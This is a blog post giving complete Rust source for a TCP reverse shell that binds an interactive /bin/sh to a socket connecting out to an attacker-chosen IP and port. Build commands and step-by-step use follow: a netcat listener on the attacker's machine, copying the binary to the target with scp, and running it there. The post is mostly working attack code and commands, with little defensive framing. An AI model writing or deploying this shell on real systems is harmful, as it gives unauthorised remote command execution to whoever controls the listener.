---
layout: post
title:  "A TCP Reverse Shell with Rust"
date:   2022-07-31 00:30:00
tags: rust tcp reverse shell
---

A reverse shell, also known as a remote shell or “connect-back shell” is used to initiate a shell session and execute commands in a target system.

![IPS](/img/tcp_reverse_shell/tcp_reverse_shell.png)

There are many examples available in [different programming languages](https://www.revshells.com/), or it is possible generating reverse shells with tools like [meterpreter](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/osx/x64/meterpreter/reverse_tcp.md) and the metasploit framework.

Furthermore, reverse shells can be implemented for any operating system and network protocols such as TCP, UDP, ICMP or over encrypted channels with SSL.

However, I'm going to use the Rust programming language and the cargo tool to generate a small program that can be 
executed as a TCP reverse shell in the target's system. Additionally, this code can be compiled for most of the Unix flavors. 

# TCP Reverse Shell

{% highlight rust %}
use std::env;
use std::fs::File;
use std::net::TcpStream;
use std::os::unix::io::{FromRawFd, RawFd};
use std::os::unix::prelude::AsRawFd;
use std::process::Command;

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        panic!("Usage: reverse_shell <IP> <PORT>");
    }

    let ip = &args[1];
    let port = &args[2];

    let tcp_stream = match TcpStream::connect(format!("{ip}:{port}")) {
        Err(why) => panic!("Connection error: {why}"),
        Ok(tcp_stream) => tcp_stream,
    };

    let raw_fd: RawFd = tcp_stream.as_raw_fd();

    let mut rev_shell = match Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { File::from_raw_fd(raw_fd) })
        .stdout(unsafe { File::from_raw_fd(raw_fd) })
        .stderr(unsafe { File::from_raw_fd(raw_fd) })
        .spawn()
    {
        Err(why) => panic!("Error: {why}"),
        Ok(child) => child,
    };

    match rev_shell.wait() {
        Err(why) => panic!("Error: {why}"),
        Ok(exit_status) => exit_status,
    };
}
{% endhighlight %}

## How to compile the code

{% highlight bash linenos %}
cargo build --release
cargo install
{% endhighlight %}

* [Source code](/src/tcp_reverse_shell/reverse_shell.tar.xz)  

**Note:* if you require to compile the code from a unix flavor to run in another one, please follow the [Rust cross-compilation instructions](https://rust-lang.github.io/rustup/cross-compilation.html).

## How to test the TCP Reverse Shell

**1** Run a TCP server listening on the 4321 port in the attacker's system.
  {% highlight bash %}
    netcat -l -s 10.10.10.1 -p 4321
  {% endhighlight %}

**2**  Copy the reverse shell program to the target's system.
  {% highlight bash %}
    scp reverse_shell demo@10.10.10.2:
  {% endhighlight %}

**3**  Run the reverse_shell from the target's system
  {% highlight bash %}
    ./reverse_shell  10.10.10.1 4321
  {% endhighlight %}

**4** The TCP server will receive a shell session in the attacker's system.


I hope you have enjoyed this small piece of code and have happy weekend.

# References

* [Install Rust](https://www.rust-lang.org/tools/install)
* [The Cargo Book](https://doc.rust-lang.org/cargo/)
* [Module std::fs](https://doc.rust-lang.org/std/fs/)
* [Module std::net](https://doc.rust-lang.org/std/net/)
* [Module std::process](https://docs.rs/rustc-std-workspace-std/1.0.1/std/process/index.html)
